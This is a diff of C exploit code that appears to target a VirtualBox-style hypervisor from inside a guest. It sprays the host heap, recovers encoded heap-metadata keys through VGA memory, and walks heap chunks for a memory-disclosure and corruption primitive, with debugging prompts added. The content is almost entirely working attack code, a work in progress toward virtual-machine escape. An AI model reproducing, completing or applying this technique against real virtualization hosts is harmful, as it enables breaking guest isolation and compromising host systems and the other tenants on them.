@@ -10,28 +10,30 @@
 #include <sys/io.h>
 #include "vmm.h"
 
+#define DEBUG
+
 #define RT_BIT(n) (1<<n)
 #define off(locality, uReg) (locality * 0x1000 + uReg)
 #define TPM_CMD_BUF_SIZE 0xf80
-#define PAGE_SIZE 0x1000                                                                                                                                                                     
-#define VMMDEV_REQUESTOR_USR_DRV 0x00000001                                                                                                                                                  
-#define VMMDEV_REQUESTOR_USR_ROOT 0x00000003                                                                                                                                                 
-#define VMMDEV_REQUESTOR_USR_USER 0x00000006                                                                                                                                                 
-                                                                                                                                                                                             
-const size_t TPM_MMIO_ADDR = 0xfed40000;                                                                                                                                                     
-const size_t TPM_MMIO_SIZE = 0x5000;                                                                                                                                                         
-const size_t VGA_MMIO_ADDR = 0xa0000;                                                                                                                                                        
-const size_t VGA_MMIO_SIZE = 0x20000;                                                                                                                                                        
-                                                                                                                                                                                             
-void *reqBuf;                                                                                                                                                                                
-uint32_t *cliIDs;                                                                                                                                                                            
-uint32_t idx;                                                                                                                                                                                
-uint8_t *vga;                                                                                                                                                                                
-const uint32_t chunkSizeMetadataOffset = 0x8;                                                                                                                                                
-const uint32_t chunkPrevSizeMetadatOffset = 0xc;                                                                                                                                             
-const uint16_t VGAR3BufferHeapSize = 0x8001; // size shifted right by 4, actual size is 0x80010                                                                                              
-uint16_t heapPrevSizeKey;                                                                                                                                                                    
-uint16_t heapSizeKey;                                                                                                                                                                        
+#define PAGE_SIZE 0x1000
+#define VMMDEV_REQUESTOR_USR_DRV 0x00000001
+#define VMMDEV_REQUESTOR_USR_ROOT 0x00000003
+#define VMMDEV_REQUESTOR_USR_USER 0x00000006
+
+const size_t TPM_MMIO_ADDR = 0xfed40000;
+const size_t TPM_MMIO_SIZE = 0x5000;
+const size_t VGA_MMIO_ADDR = 0xa0000;
+const size_t VGA_MMIO_SIZE = 0x20000;
+
+void *reqBuf;                                                                                                                                                                         
+uint32_t *cliIDs;                                                                                                                                                                     
+uint32_t idx;                                                                                                                                                                         
+uint8_t *vga;
+const uint32_t chunkSizeMetadataOffset = 0x8;
+const uint32_t chunkPrevSizeMetadatOffset = 0xc;
+const uint16_t VGAR3BufferHeapSize = 0x8001; // size shifted right by 4, actual size is 0x80010
+uint16_t heapPrevSizeKey;
+uint16_t heapSizeKey;
 
 void die(const char* msg)
 {
@@ -319,10 +321,10 @@ void spray()
 
 void checkHeapKeys()
 {
-        uint16_t prevsizeKey;
+	uint16_t prevsizeKey;
         uint16_t chunkSizeKey;
-        uint16_t mightBePrevChunkSize;
-        uint16_t chunkSize;
+        uint64_t mightBePrevChunkSize;
+        uint64_t chunkSize;
     switchVGA(2, 0);
     prevsizeKey = *(vga+3);
     switchVGA(2, 1);
@@ -358,39 +360,74 @@ void holyScan()
         // please work Jesus Christ...
         uint64_t readCount = 0;
         uint32_t currentPage = 2;
+        uint64_t ptr; //???
         uint8_t freed;
-        uint16_t currentChunkSize;
+        uint64_t currentChunkSize;
+        uint64_t currentPrevChunkSize;
+        // just to trigger debugger?
+#ifdef DEBUG
+        printf("Press enter to trigger...");
+        getchar();
+        uint8_t tmp = *(vga);
+        printf("Input ptr: ");
+        scanf("%lx", &ptr);
+#endif
         while (1){
                 switchVGA(currentPage, 0);
                 currentChunkSize = *(vga+readCount+2);
                 switchVGA(currentPage, 1);
                 currentChunkSize += *(vga+readCount+2) << 8;
-                printf("Encoded current chunk size: 0x%x\n", currentChunkSize);
+                printf("------ DEBUG ------\n");
+		printf("Encoded current chunk size: 0x%lx\n", currentChunkSize);
                 currentChunkSize ^= heapSizeKey;
                 currentChunkSize <<= 4;
                 switchVGA(currentPage, 2);
                 freed = *(vga+readCount+2) & 1;
-                printf("Freed? 0x%x\n", freed);
+		printf("Freed? 0x%x\n", freed);
                 printf("Current page: %d\n", currentPage);
                 printf("Read: 0x%lx\n", readCount);
-                printf("Current chunk size: 0x%x\n", currentChunkSize);
+                printf("Current chunk size: 0x%lx\n", currentChunkSize);
+#ifdef DEBUG
+                printf("Current address: 0x%lx\n", ptr);
+#endif
                 //getchar();
-                usleep(750);
+		sleep(1);
                 if (currentChunkSize == 0x80 && !freed) break;
                 readCount += currentChunkSize / 4;
+                ptr += currentChunkSize;
                 if (readCount > 0xffff)
                 {
+                        currentPage += (readCount / 0x10000);
                         readCount %= 0x10000;
-                        ++currentPage;
                 }
+                if (currentPage > 7)
+                {
+                        printf("Cannot read anymore, exceeded...\n");
+                        break;
+                }
+                switchVGA(currentPage, 0);
+                currentPrevChunkSize = *(vga+readCount+3);
+                switchVGA(currentPage, 1);
+                currentPrevChunkSize += *(vga+readCount+3) << 8;
+                printf("0x%lx\n", currentPrevChunkSize);
+                currentPrevChunkSize ^= heapPrevSizeKey;
+                printf("0x%lx\n", currentPrevChunkSize);
+                currentPrevChunkSize <<= 4;
+                printf("0x%lx\n", currentPrevChunkSize);
+                printf("Append address: 0x%lx + 0x%lx\n", currentPage * 0x10000 * 4, readCount * 4);
+                if (currentPrevChunkSize != currentChunkSize)
+                {
+                        printf("Broken walk???\n");
+                        printf("0x%lx != 0x%lx", currentChunkSize, currentPrevChunkSize);
+                        break;
+                }
+                printf("-------------------\n");
         }
-        printf("hmm...");
-
 }
 
 int main()
 {
-        init();
+	init();
         //while (1) spray();
         checkHeapKeys();
         spray();
